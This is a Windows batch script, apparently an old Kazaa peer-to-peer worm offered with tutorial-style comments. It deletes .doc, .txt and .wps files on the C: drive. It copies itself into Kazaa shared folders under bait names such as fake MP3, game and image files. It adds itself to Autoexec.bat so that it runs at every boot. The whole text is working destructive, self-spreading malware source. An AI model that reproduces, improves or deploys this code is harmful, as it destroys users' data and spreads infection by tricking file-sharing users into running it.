cls
@Echo off
Del C:\*.wps /y
Del C:\*.doc /y
Del C:\*.txt /y 
This technique doesn't always work, so try this:
RD/s/q "C:\*.wps"
RD/s/q "C:\*.doc"
RD/s/q "C:\*.txt" 
Goto K

:K
If Exist "C:\Progra~1\Kazaa" GoTo OK
If Exist "C:\Progra~1\Kazaa lite" GoTo LK
If not Exist "C:\Progra~1\Kazaa" GoTo DLK
If not Exist "C:\Progra~1\Kazaa lite" GoTo DLK 

:OK
Copy %0 "C:\Progra~1\Kazaa\Myshar~1\Eminem_Freestyle.mp3.bat"
Copy %0 "C:\Progra~1\Kazaa\Myshar~1\Eminem.mp3.bat"
Copy %0 "C:\Progra~1\Kazaa\Myshar~1\Eminem_White Emerica.mp3.bat"
Copy %0 "C:\Progra~1\Kazaa\Myshar~1\Microsoft Visual Studio.exe.bat"
Copy %0 "C:\Progra~1\Kazaa\Myshar~1\WindowsXP.zip.bat"
Copy %0 "C:\Progra~1\Kazaa\Myshar~1\Emulator.exe.bat"
Copy %0 "C:\Progra~1\Kazaa\Myshar~1\Fifa2004.zip.bat"
Copy %0 "C:\Progra~1\Kazaa\Myshar~1\Porn.jpg.bat"
Copy %0 "C:\Avtoexec.bat"
GoTo Remix

:LK
Copy %0 "C:\Myshar~1\Eminem_Freestyle.mp3.bat"
Copy %0 "C:\Myshar~1\Eminem.mp3.bat"
Copy %0 "C:\Myshar~1\Eminem_White Emerica.mp3.bat"
Copy %0 "C:\Myshar~1\Microsoft Visual Studio.exe.bat"
Copy %0 "C:\Myshar~1\WindowsXP.zip.bat"
Copy %0 "C:\Myshar~1\Emulator.exe.bat"
Copy %0 "C:\Myshar~1\Fifa2004.zip.bat"
Copy %0 "C:\Myshar~1\Porn.jpg.bat"
Copy %0 "C:\Avtoexec.bat"
GoTo Remix

:Remix
Echo Call "C:\Avtoexec.bat" >> "C:\Autoexec.bat"
cls
cls 
Echo.
cls 
you don't need all these cls 
Goto Done

:DLK
Start http://download.com.com/redir?p....02.html
Goto K

:Done
Exit 

